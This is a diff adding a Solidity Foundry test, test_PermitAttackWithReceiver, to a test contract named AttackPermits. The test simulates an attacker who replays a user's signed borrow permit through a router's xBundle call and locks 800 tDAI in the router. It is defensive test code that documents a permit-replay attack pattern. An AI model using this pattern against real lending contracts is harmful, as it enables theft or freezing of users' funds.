@@ -72,4 +72,35 @@ contract AttackPermits is MockingSetup, Routines {
 
     assertEq(IERC20(debtAsset).balanceOf(attacker), 0);
   }
+
+  function test_PermitAttackWithReceiver() public {
+    // Alice signs a message for `simpleRouter` to borrow 800 tDAI and do "something" with
+    // funds. Therefore 'receiver` is also `operator`.
+    uint256 newBorrowAmount = 800e18;
+
+    LibSigUtils.Permit memory permit = LibSigUtils.buildPermitStruct(
+      ALICE, address(simpleRouter), address(simpleRouter), newBorrowAmount, 0, address(vault)
+    );
+
+    (uint256 deadline, uint8 v, bytes32 r, bytes32 s) =
+      _getPermitBorrowArgs(permit, ALICE_PK, address(vault));
+
+    // Attacker "somehow" gets hold of this signed message and calls simpleRouter.
+    IRouter.Action[] memory actions = new IRouter.Action[](2);
+
+    actions[0] = IRouter.Action.PermitBorrow;
+    actions[1] = IRouter.Action.Borrow;
+
+    bytes[] memory args = new bytes[](2);
+
+    args[0] =
+      abi.encode(address(vault), ALICE, address(simpleRouter), newBorrowAmount, deadline, v, r, s);
+    args[1] = abi.encode(address(vault), newBorrowAmount, address(simpleRouter), ALICE);
+
+    // With this call the attacker locks the funds in the simpleRouter contract.
+    vm.prank(attacker);
+    simpleRouter.xBundle(actions, args);
+
+    assertEq(IERC20(debtAsset).balanceOf(address(simpleRouter)), newBorrowAmount);
+  }
 }
